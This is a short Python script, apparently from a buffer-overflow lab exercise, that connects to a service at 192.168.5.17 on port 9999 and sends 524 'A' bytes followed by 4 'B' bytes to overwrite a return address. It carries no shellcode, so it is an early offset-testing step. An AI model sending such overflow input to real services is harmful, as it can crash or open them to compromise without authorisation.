import socket
import sys
import time

aChars = 'A' * 524
bChars = 'B' * 4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.5.17',9999))
    print(s.recv(1024))
    print('Trying to buffer overflow with a (524 A + 4 B)...')
    s.send(aChars + bChars)
    print(s.recv(1024))
    s.close()
except Exception:
    sys.exit()
